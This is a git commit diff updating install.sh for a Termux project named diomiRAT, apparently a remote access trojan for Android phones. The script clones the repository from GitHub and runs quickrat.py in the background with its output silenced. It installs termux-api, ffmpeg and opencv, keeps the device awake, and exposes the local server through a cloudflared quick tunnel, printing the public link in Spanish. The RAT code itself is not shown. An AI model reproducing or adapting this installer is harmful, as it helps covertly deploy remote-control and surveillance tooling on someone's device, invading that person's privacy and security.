eed2f6b77f6f86e93b373b6f0caa9606868978e3
Diomi <148664970+Diomi1@users.noreply.github.com>
2025-11-29 19:44:03 -0400

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,17 +1,20 @@
 #!/bin/bash
+clear
 pkg update -y
-pkg install python termux-api ffmpeg cloudflared wget -y
-pip install flask opencv-python pillow
+pkg install -y python termux-api ffmpeg cloudflared
+pip install flask opencv-python pillow --quiet
 cd $HOME
-rm -rf diomiRAT
-git clone https://github.com/Diomi1/diomiRAT.git
-cd diomiRAT
+rm -rf rat
+git clone https://github.com/Diomi1/diomiRAT rat
+cd rat
 chmod +x quickrat.py
 pkill -f quickrat.py
 pkill -f cloudflared
 termux-wake-lock
 nohup python quickrat.py > /dev/null 2>&1 &
 nohup cloudflared tunnel --url http://localhost:5000 > /dev/null 2>&1 &
-sleep 15
-echo "LISTO – Abre este enlace en tu PC:"
-cloudflared tunnel --url http://localhost:5000 | grep -o "https://.*trycloudflare.com" | head -1
+sleep 12
+echo "════════════════════════"
+cloudflared tunnel --url http://localhost:5000 2>/dev/null | grep -o "https://.*trycloudflare.com" | head -1
+echo "════════════════════════"
+echo "Guarda ese enlace. Listo."
